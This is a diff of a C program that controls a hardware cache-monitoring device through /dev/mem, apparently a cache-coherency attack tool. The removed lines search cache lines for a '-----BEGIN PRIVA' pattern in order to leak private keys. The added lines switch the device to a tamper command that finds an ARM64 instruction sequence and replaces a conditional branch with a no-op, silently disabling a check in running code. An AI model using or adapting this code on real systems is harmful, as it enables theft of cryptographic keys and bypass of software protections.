@@ -30,6 +30,7 @@
 #define CMD_pos     22
     #define CMD_LEAK        0
     #define CMD_POISON      1
+    #define CMD_TAMPER_CL   2
 
 // Status Reg bits
 #define OSH_END_pos 0
@@ -93,6 +94,7 @@ int main() {
     static unsigned int *PATTERN14;          
     static unsigned int *PATTERN15; 
     static unsigned int *PATTERN_SIZE; 
+    static unsigned int *WORD_INDEX; 
 
     // Open /dev/mem to access physical memory
     mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
@@ -158,30 +160,33 @@ int main() {
     PATTERN14 = map_base+46;
     PATTERN15 = map_base+47;
     PATTERN_SIZE = map_base+48;
+    WORD_INDEX = map_base+49;
   
     // Cache line to write
-    *DATA0   = 0xAAAAAAAA;
-    *DATA1   = 0x00000001;
-    *DATA2   = 0x00000002;
-    *DATA3   = 0x00000003;
-    *DATA4   = 0x00000004;
-    *DATA5   = 0x00000005;
-    *DATA6   = 0x00000006;
-    *DATA7   = 0x00000007;
-    *DATA8   = 0x00000008;
-    *DATA9   = 0x00000009;
-    *DATA10  = 0x0000000A;
-    *DATA11  = 0x0000000B;
-    *DATA12  = 0x0000000C;
-    *DATA13  = 0x0000000D;
-    *DATA14  = 0x0000000E;
-    *DATA15  = 0x0000000F;
-    
+    // *DATA0   = 0xAAAAAAAA;
+    *DATA1   = 0xaa0103e1; // cahnge cbnz by a dummy operation -> mov x1, x1
+    // *DATA2   = 0x00000002;
+    // *DATA3   = 0x00000003;
+    // *DATA4   = 0x00000004;
+    // *DATA5   = 0x00000005;
+    // *DATA6   = 0x00000006;
+    // *DATA7   = 0x00000007;
+    // *DATA8   = 0x00000008;
+    // *DATA9   = 0x00000009;
+    // *DATA10  = 0x0000000A;
+    // *DATA11  = 0x0000000B;
+    // *DATA12  = 0x0000000C;
+    // *DATA13  = 0x0000000D;
+    // *DATA14  = 0x0000000E;
+    // *DATA15  = 0x0000000F;
+
+    *WORD_INDEX = 0x00000002; // Just use the 2nd word
+
     // Pattern to search 
-    *PATTERN0  = 0x2d2d2d2d; 
-    *PATTERN1  = 0x4745422d; 
-    *PATTERN2  = 0x50204e49; 
-    *PATTERN3  = 0x41564952; 
+    *PATTERN0  = 0x52800001; 
+    *PATTERN1  = 0x350000a0; 
+    *PATTERN2  = 0xb9402e60; 
+    *PATTERN3  = 0x52800021; 
     // *PATTERN4  = 0xb9001be0; 
     // *PATTERN5  = 0xb9001fff; 
     // *PATTERN6  = 0x52a80000; 
@@ -218,7 +223,7 @@ int main() {
     *ctrl    =    (0b00001 << CRRESP_pos) 
                 // | (1 << ACFLT_pos) 
                 // | (1 << ADDRFLT_pos) 
-                | (CMD_LEAK << CMD_pos)
+                | (CMD_TAMPER_CL << CMD_pos)
                 | (FUNC_PDT << FUNC_pos) 
                 | (1 << PDTEN_pos)               
                 | (1 << MONEN_pos)               
